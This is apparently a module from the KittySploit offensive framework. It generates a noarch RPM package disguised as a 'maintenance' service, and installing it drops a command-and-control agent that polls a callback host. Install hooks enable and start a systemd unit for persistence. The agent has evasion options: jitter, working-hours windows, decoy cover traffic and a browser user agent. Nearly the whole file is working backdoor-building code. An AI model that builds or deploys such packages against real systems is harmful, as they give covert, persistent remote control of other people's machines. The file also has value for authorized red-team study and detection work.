from kittysploit import *
import os
import shutil
from pathlib import Path

from lib.c2.agent_installer import build_systemd_unit
from lib.c2.agent_spec import AgentSpec
from lib.c2.backdoor_identity import apply_implant_identity
from lib.c2.kitty_agent import build_kitty_agent_from_spec
from lib.compile.rpm_helpers import build_binary_rpm


class Module(Backdoor):
    """RPM package with Kitty agent + systemd (pure Python, cross-platform)."""

    __info__ = {
        "name": "RPM Package Creator (Kitty Agent)",
        "description": (
            "Builds a noarch RPM with Kitty HTTP polling agent and systemd persistence. "
            "Pure Python generation (works on Windows/macOS/Linux). "
            "Controller: listeners/multi/reverse_http_polling."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": SessionType.POLLING,
        "listener": "listeners/multi/reverse_http_polling",
    }

    lhost = OptString("127.0.0.1", "Callback host", True)
    lport = OptPort(8088, "Callback port", True)
    url_prefix = OptString("/c2", "URL prefix", False)
    client_id = OptString("", "Client/implant ID (auto with implant_identity)", False)
    implant_identity = OptBool(True, "Generate Ed25519 implant identity", False)
    implant_id = OptString("", "Existing implant ID to reuse", False)
    poll_interval = OptInteger(10, "Base poll interval seconds", False)
    jitter_percent = OptInteger(35, "Poll jitter percent", False)
    kill_date = OptString("", "Kill date ISO YYYY-MM-DD", False)
    working_hours = OptString("", "HH:MM-HH:MM window", False)
    timezone = OptString("UTC", "Timezone", False)
    sleep_outside_hours = OptInteger(3600, "Sleep outside hours", False)
    user_agent = OptString("Mozilla/5.0", "HTTP User-Agent", False)
    cover_traffic = OptBool(True, "Decoy HTTP requests", False)
    use_ssl = OptBool(False, "HTTPS callback", False)

    package_name = OptString("ks-maint", "RPM package name", True)
    version = OptString("1.0", "Package version", True)
    release = OptString("1", "RPM release tag", False)
    python_binary = OptString("/usr/bin/python3", "Python path in unit file", False)

    def _build_agent_script(self) -> str:
        identity = apply_implant_identity(self)
        spec = AgentSpec.from_module(
            self,
            client_id=identity.implant_id if identity else None,
            private_key_pem=identity.private_key_pem if identity else None,
        )
        if not identity and not str(self.client_id or "").strip():
            spec.client_id = "rpm-agent"
        return build_kitty_agent_from_spec(spec)

    def _write_payload_tree(self, data_dir: Path) -> None:
        pkg = str(self.package_name)
        py = str(self.python_binary or "/usr/bin/python3")
        agent_path = data_dir / "usr" / "bin" / f"{pkg}_agent.py"
        agent_path.parent.mkdir(parents=True, exist_ok=True)
        agent_path.write_text(self._build_agent_script(), encoding="utf-8")
        os.chmod(agent_path, 0o700)

        unit = build_systemd_unit(
            pkg,
            f"{py} /usr/bin/{pkg}_agent.py",
            description=f"{pkg} maintenance service",
        )
        systemd_dir = data_dir / "usr" / "lib" / "systemd" / "system"
        systemd_dir.mkdir(parents=True, exist_ok=True)
        (systemd_dir / f"{pkg}.service").write_text(unit, encoding="utf-8")

    def _postin_script(self) -> str:
        pkg = str(self.package_name)
        return f"""#!/bin/sh
if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
    systemctl daemon-reload || true
    systemctl enable {pkg}.service >/dev/null 2>&1 || true
    systemctl start {pkg}.service >/dev/null 2>&1 || true
fi
"""

    def _preun_script(self) -> str:
        pkg = str(self.package_name)
        return f"""#!/bin/sh
if [ "$1" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
    systemctl stop {pkg}.service >/dev/null 2>&1 || true
    systemctl disable {pkg}.service >/dev/null 2>&1 || true
fi
"""

    def run(self):
        try:
            pkg = str(self.package_name)
            ver = str(self.version)
            rel = str(self.release or "1")

            print_success(f"Creating RPM package: {pkg} v{ver}-{rel}")
            print_success(f"Agent callback: {self.lhost}:{self.lport}")

            output_dir = Path(self.output_dir_path("backdoors/linux/rpm"))
            output_dir.mkdir(parents=True, exist_ok=True)

            data_dir = output_dir / f"{pkg}-{ver}_root"
            if data_dir.exists():
                shutil.rmtree(data_dir)
            data_dir.mkdir(parents=True)
            self._write_payload_tree(data_dir)

            rpm_path = output_dir / f"{pkg}-{ver}-{rel}.noarch.rpm"
            build_binary_rpm(
                rpm_path,
                name=pkg,
                version=ver,
                release=rel,
                file_tree=data_dir,
                summary=f"{pkg} maintenance agent",
                description="KittySploit HTTP polling agent (authorized testing only).",
                postin=self._postin_script(),
                preun=self._preun_script(),
            )

            readme = f"""# {pkg} RPM

Generated in pure Python (no rpmbuild required).

## Install on RHEL/Fedora/CentOS
```bash
sudo rpm -ivh {rpm_path.name}
```

## Verify
```bash
systemctl status {pkg}.service
```

Callback: {self.lhost}:{self.lport}{self.url_prefix or '/c2'}
"""
            (output_dir / "README.md").write_text(readme, encoding="utf-8")
            shutil.rmtree(data_dir, ignore_errors=True)

            print_success(f"RPM built: {rpm_path.name}")
            print_success(f"Location: {rpm_path.absolute()}")
            print_success(f"Output directory: {output_dir.absolute()}")
            return True

        except Exception as exc:
            print_error(f"rpm_packaging failed: {exc}")
            import traceback

            traceback.print_exc()
            return False
